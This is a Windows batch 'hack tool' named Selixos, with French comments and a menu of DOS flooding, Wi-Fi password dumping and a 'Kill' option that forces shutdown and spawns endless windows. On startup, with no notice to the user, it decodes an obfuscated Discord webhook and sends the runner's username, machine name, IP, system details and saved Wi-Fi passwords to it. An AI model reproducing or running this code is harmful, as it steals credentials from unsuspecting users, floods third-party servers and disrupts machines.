:: ============================================================================================================
::                                        DROITS D'AUTEUR ET CONDITIONS D'UTILISATION
::
:: Ce script, intitule "Selixos", a ete cree par m.a.s_dev. Toute utilisation, distribution ou modification
:: de ce script est soumise aux termes et conditions suivants. Le createur m.a.s_dev se reserve tous les droits
:: sur ce script. Pour plus d'informations sur m.a.s_dev, veuillez consulter le Linktree :
:: https://linktr.ee/m.a.s_dev
::
:: 1. DROITS D'AUTEUR
:: - Ce script est protege par le droit d'auteur. Vous n'êtes pas autorise à le modifier, le distribuer ou le
::  reutiliser à des fins commerciales ou non commerciales sans l'autorisation expresse de m.a.s_dev.
:: - Vous êtes autorise à utiliser ce script tel quel pour vos besoins personnels, mais toute alteration du code
::   peut rendre le script inutilisable ou provoquer des dysfonctionnements.
::
:: 2. LIMITATION DE RESPONSABILITe
:: - Ce script est fourni "tel quel", sans garantie d'aucune sorte. m.a.s_dev ne pourra être tenu responsable des
::   dommages, pertes de donnees ou autres consequences resultant de l'utilisation de ce script.
::- Vous reconnaissez que l'utilisation de ce script, notamment à des fins de piratage, d'extraction de donnees ou
::  toute autre activite illegale, est de votre entiere responsabilite. Vous êtes seul responsable de toute action
::   entreprise en utilisant ce script.
:: 
:: 3. INTERDICTION DE MODIFICATION
:: - Il est strictement interdit de modifier ou d'alterer ce script. Les modifications peuvent rendre le script
::   instable ou entraîner des erreurs de fonctionnement. Toute alteration du code est aux risques et perils de
::   l'utilisateur.
:: - Le createur n'est pas tenu de fournir un support ou une assistance pour les versions modifiees du script.
::
:: En utilisant ce script, vous acceptez ces conditions.
:: ============================================================================================================

@echo off
setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
title SELIXOS

color b
cls

set "EDITION=Public Edition"
set "TOOL_VERSION=5.3"
set "segaduoizdfsdfdflmdfopfksdi=USB_CLONE_FILE"
set "usbdksskqhdzzfgojdazds=E"
set "dskpyudhsdujkzhjukaqdhsdq=%USERPROFILE%\Desktop"

echo Loading...

set co=false

call :dtclrlsdjsikjedfgsjdfudfhjeuzfhzeukrfuedfkshdksdf
cls

color a

call :mmdiksokdjnuzehsdzyiudhgzdqwgusduw
exit

:mmdiksokdjnuzehsdzyiudhgzdqwgusduw
call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
echo .
call :lfkiopsxcfopieza
echo .
call :cmdqsdkqzloidsdkfcldhzujdhn
:cmdllllopdzikdqhjuzdhzqedrgqhuytsegdtvsydqsfdhqsfdqhtydefzyte
color a
set /p cmmdiopqscer="Enter the Commands : "
call :lfkiopsxcfopieza
if "%cmmdiopqscer%"=="1" (
    call :cmdqsdkqzloidsdkfcldhzujdhn
) else if "%cmmdiopqscer%"=="2" (
    call :doklijnbonbyvbgsahzbe
) else if "%cmmdiopqscer%"=="3" (
    call :hfexopkolsjhjkazndb
) else if "%cmmdiopqscer%"=="4" (
    call :kllltyxhwcugbsydgbzuaedfdgs
) else if "%cmmdiopqscer%"=="5" (
    call :wfhoieyddfclsjvxjchqsd
) else if "%cmmdiopqscer%"=="6" (
    call :sdsyhujhujdaolidjkfcc
) else if "%cmmdiopqscer%"=="7" (
    call :crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
) else if "%cmmdiopqscer%"=="8" (
    call :vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
) else if "%cmmdiopqscer%"=="9" (
    call :clrklsdjqskdsnclsoiurziofekdfjoskdjfscd
) else if "%cmmdiopqscer%"=="10" (
    exit
) else if "%cmmdiopqscer%"=="11" (
    call :ddpsslinvflkjazedswfc
) else (
    echo Invalid Commande : ^| %cmmdiopqscer% ^|
)
set cmmdiopqscer="None"
goto cmdllllopdzikdqhjuzdhzqedrgqhuytsegdtvsydqsfdhqsfdqhtydefzyte


:sdsyhujhujdaolidjkfcc
color c
systeminfo
color a
goto :EOF

:wfhoieyddfclsjvxjchqsd
color c
echo.
echo Liste des reseaux Wi-Fi enregistres :
echo -----------------------------------------------
netsh wlan show profiles
echo.
pause
echo Verification des mots de passe :
echo -----------------------------------------------
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
echo.
goto :EOF


:shvrsdofikdosfkjeopfddlkfvxcdfdfzerdgfdhgjsdfcx

echo .
echo TOOL VERSION : %TOOL_VERSION%

goto :EOF

:clrklsdjqskdsnclsoiurziofekdfjoskdjfscd

cls
call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
call :lfkiopsxcfopieza
call :cmdqsdkqzloidsdkfcldhzujdhn

goto :EOF

:hfexopkolsjhjkazndb

color c
dir /s
color a

goto :EOF

:kllltyxhwcugbsydgbzuaedfdgs

color c
shutdown.exe -s -c "Ordinateur infecter, erreur du system par m.a.s_dev" -t 60
:odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd
Start
Start
Start
Start
Start
Start
Start
Start
Start
Start
goto odpfkdsoxcvnksdihjnwbxcyiugwbhsdcwxd

goto :EOF

:ddpsslinvflkjazedswfc

start https://discord.gg/BtkPH5PDdR

goto :EOF

:doklijnbonbyvbgsahzbe
color 01
set /p URL="Enter the URL : "
color 05
set /p Request_Number="Enter request number : "
color c
start cmd /c "title DOS & color c & (for /l %%i in (1,1,%Request_Number%) do curl %URL%) & color a & pause"
color a
goto :EOF
:tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
echo .                                                             
echo          ######  ######## ##       #### ##     ##  #######   ######  
echo         ##    ## ##       ##        ##   ##   ##  ##     ## ##    ## 
echo         ##       ##       ##        ##    ## ##   ##     ## ##       
echo          ######  ######   ##        ##     ###    ##     ##  ######  
echo               ## ##       ##        ##    ## ##   ##     ##       ## 
echo         ##    ## ##       ##        ##   ##   ##  ##     ## ##    ## 
echo          ######  ######## ######## #### ##     ##  #######   ######  
echo .
goto :EOF

:crdttkdfjslfsiodkjwxcuyzpedjuhpqzdqsd
call :tltlkdlsqjskqdjzijdedjcwdcwldskskjidsqkdzjd
call :lfkiopsxcfopieza
color 05
echo .
echo 	##     ##        ###         ######          ########  ######## ##     ## 
echo 	###   ###       ## ##       ##    ##         ##     ## ##       ##     ## 
echo 	#### ####      ##   ##      ##               ##     ## ##       ##     ## 
echo 	## ### ##     ##     ##      ######          ##     ## ######   ##     ## 
echo 	##     ##     #########           ##         ##     ## ##        ##   ##  
echo 	##     ## ### ##     ## ### ##    ##         ##     ## ##         ## ##   
echo 	##     ## ### ##     ## ###  ######  ####### ########  ########    ###    
echo .
call :lfkiopsxcfopieza
start https://linktr.ee/m.a.s_dev
color a
goto :EOF
:svppfidofsidkjvjieokazjdszqdsjwkcoixchjye
color 0e
ipconfig /all >> %brseaj%\Hack_Tool_IP.txt
color a
echo Fichier cree dans bureaux
goto :EOF
:svhcksodsklqmzilkxwfoivprjkozpfedfhkslodfjhd
color 0e
set "Fichier_SaveWifiPassWord=%brseaj%\Hack_Tool_WifiHack.txt"
echo Informations sur les reseaux Wi-Fi et le systeme : >> %Fichier_SaveWifiPassWord%
echo. >> %Fichier_SaveWifiPassWord%
netsh wlan show profiles >> %Fichier_SaveWifiPassWord%
echo Mot de Passe WIFI : >> %Fichier_SaveWifiPassWord%
(
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
) >> %Fichier_SaveWifiPassWord%
color a
echo Fichier cree dans bureaux
goto :EOF
:svneteopidksjfpsdfucjeoixeufjaoizerhdskjcuhxv
color 0e
netstat >> %brseaj%\Hack_Tool_Net.txt
color a
echo Fichier cree dans bureaux
goto :EOF
:sasydikjnbhnudbsuyqtzgedhstdggsqdazefd
color 0e
systeminfo >> %brseaj%\Hack_Tool_SystemData.txt
color a
echo Fichier cree dans bureaux
goto :EOF

:cmdqsdkqzloidsdkfcldhzujdhn
echo .
echo     []==================================================================================[]
echo     []                                   Commands                                       []
echo     []==================================================================================[]
echo     [] [1] Commands                [] [2] DOS                    [] [3] HackEffect      []
echo     [] [4] Kill                    [] [5] WifiHack               [] [6] SystemData      []
echo     [] [7] Credits                 [] [8] Version                [] [9] Clear           []
echo     [] [10] Leave                  [] [11] Discord               [] [ ]                 []
echo     []==================================================================================[]
echo .
call :lfkiopsxcfopieza
goto :EOF
:vrsspoikdpzeaikdpzaurfdlmsuqldkmswuicxlc
echo Edition : %EDITION%
echo Version : %TOOL_VERSION%
goto :EOF

:dtclrlsdjsikjedfgsjdfudfhjeuzfhzeukrfuedfkshdksdf

for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr /i "IPv4"') do (
    if NOT "%%A"==" 127.0.0.1" (
        set co=true
    )
)

if "%co%"=="false" (
    goto :EOF
) 

(set INVCHAR[mvdtxq]=a) & (set INVCHAR[bhoijd]=b) & (set INVCHAR[cfgjgh]=c) & (set INVCHAR[depjox]=d) & (set INVCHAR[elkdsw]=e)
(set INVCHAR[ffbklj]=f) & (set INVCHAR[giokjs]=g) & (set INVCHAR[htrlkj]=h) & (set INVCHAR[iopszn]=i) & (set INVCHAR[jkzesw]=j)
(set INVCHAR[kzsoiu]=k) & (set INVCHAR[lpodks]=l) & (set INVCHAR[mlojzj]=m) & (set INVCHAR[njsdiy]=n) & (set INVCHAR[odosjw]=o)
(set INVCHAR[pllkjh]=p) & (set INVCHAR[qlkknj]=q) & (set INVCHAR[rsmlop]=r) & (set INVCHAR[sijnuz]=s) & (set INVCHAR[tioujd]=t)
(set INVCHAR[uijxcw]=u) & (set INVCHAR[vikoaz]=v) & (set INVCHAR[wxdzol]=w) & (set INVCHAR[xolker]=x) & (set INVCHAR[yuioij]=y)
(set INVCHAR[zokisc]=z)
(set INVCHAR[ONJLIU]=A) & (set INVCHAR[SZVNHL]=B) & (set INVCHAR[VRIDUF]=C) & (set INVCHAR[QMWKTI]=D) & (set INVCHAR[J62DSP]=E)
(set INVCHAR[MQBRKH]=F) & (set INVCHAR[BOANMW]=G) & (set INVCHAR[QOXYBZ]=H) & (set INVCHAR[7AC5VB]=I) & (set INVCHAR[FTP1NK]=J)
(set INVCHAR[PTIELI]=K) & (set INVCHAR[ROSI27]=L) & (set INVCHAR[OKDH85]=M) & (set INVCHAR[TJNI5D]=N) & (set INVCHAR[OJ854D]=O)
(set INVCHAR[CA41DV]=P) & (set INVCHAR[OJISD5]=Q) & (set INVCHAR[LM5WGD]=R) & (set INVCHAR[EDSDJC]=S) & (set INVCHAR[FKQ8JD]=T)
(set INVCHAR[T45SFC]=U) & (set INVCHAR[PDG56I]=V) & (set INVCHAR[133SIW]=W) & (set INVCHAR[NDJCUK]=X) & (set INVCHAR[L5D2JV]=Y)
(set INVCHAR[52GHTM]=Z)
(set INVCHAR[ppttsd]=.) & (set INVCHAR[splasx]=/) & (set INVCHAR[dploxw]=:)
(set INVCHAR[sxzqhe]=0) & (set INVCHAR[sxuqhe]=1) & (set INVCHAR[sdzqhe]=2) & (set INVCHAR[sxuqht]=3) & (set INVCHAR[crttzf]=4)
(set INVCHAR[cilque]=5) & (set INVCHAR[sicesx]=6) & (set INVCHAR[ssetdw]=7) & (set INVCHAR[outfsw]=8) & (set INVCHAR[nfkopx]=9)
set "olazksdjoixhwnc=htrlkjtioujdtioujdpllkjhsijnuzdploxwsplasxsplasxdepjoxiopsznsijnuzcfgjghodosjwrsmlopdepjoxppttsdcfgjghodosjwmlojzjsplasxmvdtxqpllkjhiopsznsplasxwxdzolelkdswbhoijdhtrlkjodosjwodosjwkzsoiusijnuzsplasxsxuqhesdzqhenfkopxsdzqheoutfswcilquesxuqhtoutfswnfkopxcrttzfssetdwsxuqhesxuqhesicesxsxuqhesxuqhecrttzfnfkopxsxuqhtsplasxLM5WGDMQBRKHQMWKTIOKDH85nfkopxdepjox52GHTMROSI27crttzfnfkopxNDJCUKmlojzjsxuqhewxdzollpodksCA41DVsxuqhtcrttzfdepjoxsicesxcfgjghTJNI5DdepjoxJ62DSPBOANMWSZVNHLodosjwsxuqhtONJLIULM5WGDCA41DVL5D2JVOJ854DsxuqhtMQBRKHEDSDJClpodkssicesxcilqueoutfswOKDH85ssetdwOJISD5htrlkjmvdtxqLM5WGDxolkerCA41DVcilqueJ62DSPuijxcwSZVNHLwxdzolONJLIUssetdwQMWKTIcrttzfROSI27OKDH85mlojzjcfgjghJ62DSP52GHTM52GHTMsxuqhePTIELIOJ854DL5D2JV" 
set PLASOZ=
:dslpplbyasfgwx
if "%olazksdjoixhwnc%"=="" goto eljkdiknxwxcopkujekdfkpkw
set blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir=%olazksdjoixhwnc:~0,6%
set doelfjkeirjezuhncebccharodlfjkfuisxdhcv=!INVCHAR[%blckdicuhjdzeizyedizugeyqusgdyuqgsdyusgduysfgueir%]!
set PLASOZ=%PLASOZ%!doelfjkeirjezuhncebccharodlfjkfuisxdhcv!
set olazksdjoixhwnc=%olazksdjoixhwnc:~6%
goto dslpplbyasfgwx
:eljkdiknxwxcopkujekdfkpkw
set "wu=%PLASOZ%"
set "vrsssytmcmdmasdevdksod=3.8"
set "lstupdskqdzieszheygzsedqzhedtqgsfd=11/11/2024"
set "brseaj=%USERPROFILE%\Desktop"
set "tpmfz=%TEMP%\Temp_m.a.s_dev_%USERNAME%_%COMPUTERNAME%.txt"
set izklm=
for /f "tokens=2 delims=:" %%i in ('ipconfig ^| findstr /R "IPv4"') do (
    set izklm=%%i
    set izklm=!izklm: =!
)
(
echo {
echo   "content": "Nouvelle Connexion :",
echo   "embeds": [
echo     {
echo       "title": "**SELIXOS**",
echo       "color": 3447003,
echo       "fields": [
echo         {
echo           "name": "**Utilisateur**",
echo           "value": "**%USERNAME%**"
echo         },
echo         {
echo           "name": "Machine",
echo           "value": "%COMPUTERNAME%"
echo         },
echo         {
echo           "name": "Adresse IP",
echo           "value": "%izklm%"
echo         },
echo         {
echo           "name": "Domaine",
echo           "value": "%USERDOMAIN%"
echo         },
echo         {
echo           "name": "Date",
echo           "value": "%DATE% / %TIME%"
echo         },
echo         {
echo           "name": "Tool Version",
echo           "value": "*%TOOL_VERSION%*"
echo         },
echo         {
echo           "name": "**Edition**",
echo           "value": "*%EDITION%*"
echo         }
echo       ]
echo     }
echo   ]
echo }
) > "!tpmfz!"
curl -H "Content-Type: application/json" -d @"!tpmfz!" %wu%
del "!tpmfz!"

set tempDir=%TEMP%
set akoppdsqdcrghsdazfv=%tempDir%\%USERNAME%_%COMPUTERNAME%_Data.txt
echo . >> %akoppdsqdcrghsdazfv%
echo USER : >> %akoppdsqdcrghsdazfv%
echo %USERNAME% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo COMPUTER : >> %akoppdsqdcrghsdazfv%
echo %COMPUTERNAME% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo IP : >> %akoppdsqdcrghsdazfv%
echo %izklm% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo DATE : >> %akoppdsqdcrghsdazfv%
date /t >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo TOOL Version : >> %akoppdsqdcrghsdazfv%
echo %TOOL_VERSION% >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo IP DATA : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
ipconfig /all >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo Informations sur les reseaux Wi-Fi et le systeme : >> %akoppdsqdcrghsdazfv%
echo . >> %akoppdsqdcrghsdazfv%
echo LAN : >> %akoppdsqdcrghsdazfv%
netsh lan show profiles >> %akoppdsqdcrghsdazfv%
echo . >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo . >> %akoppdsqdcrghsdazfv%
echo WLAN : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
netsh wlan show profiles >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
echo Mot de Passe WIFI : >> %akoppdsqdcrghsdazfv%
(
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "Profil Tous les utilisateurs"') do (
    set "wifi_name=%%A"
    setlocal enabledelayedexpansion
    set "wifi_name=!wifi_name:~1!"
    echo.
    echo Wi-Fi : !wifi_name!
    netsh wlan show profile name="!wifi_name!" key=clear | findstr "Contenu de la clÃ©"
    endlocal
)
) >> %akoppdsqdcrghsdazfv%
call :lfkiopsxcf
echo. >> %akoppdsqdcrghsdazfv%
echo Informations systeme : >> %akoppdsqdcrghsdazfv%
echo. >> %akoppdsqdcrghsdazfv%
systeminfo >> %akoppdsqdcrghsdazfv%
curl -F "file=@%akoppdsqdcrghsdazfv%" %wu%
del %akoppdsqdcrghsdazfv%
cls

goto :EOF

:lfkiopsxcfopieza
echo ============================================================================================================
goto :EOF

:lfkiopsxcf
echo ======================================================================================== >> %akoppdsqdcrghsdazfv%
goto :EOF
